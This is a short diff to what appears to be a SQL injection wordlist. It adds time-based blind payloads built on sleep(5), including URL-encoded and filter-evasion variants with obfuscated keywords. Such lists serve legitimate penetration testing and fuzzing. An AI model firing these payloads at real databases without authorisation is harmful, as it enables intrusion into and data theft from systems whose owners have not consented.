@@ -51,7 +51,12 @@
 ' AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 ' OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 ' SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+" and sleep(5) and "1"="1
 " and sleep(5) --+
  and sleep(5)
 ' and sleep(5) and '1'='1
-" and sleep(5) and "1"="1
+") and sleep(5) %23
+%27%20and%20sleep(5)%20%23
+"%20or%20sleep(5)%20%23
+')%a0anandd%a0sleep(5)%a0anandd%a0('1')=('1
+"%20or%20sleep(5)%20--+
